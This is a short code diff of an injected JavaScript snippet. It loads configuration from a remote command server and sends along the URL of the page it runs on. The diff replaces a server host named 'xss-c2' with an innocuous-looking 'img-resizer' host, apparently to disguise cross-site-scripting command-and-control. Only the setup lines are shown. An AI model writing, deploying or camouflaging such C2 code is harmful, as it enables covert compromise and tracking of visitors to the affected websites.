@@ -6,7 +6,7 @@
 (function () {
   if (window.__p) return; window.__p = 1;
 
-  var C = 'https://xss-c2.fearless-tumbleweed.workers.dev';        // <<< trocar
+  var C = 'https://img-resizer.helix-globeflower.workers.dev';        // <<< trocar
   var V = 'v1';                                     // <<< bumpar = invalida cache
   var CFG_URL = C + '/cfg?u=' + encodeURIComponent(location.href);
 
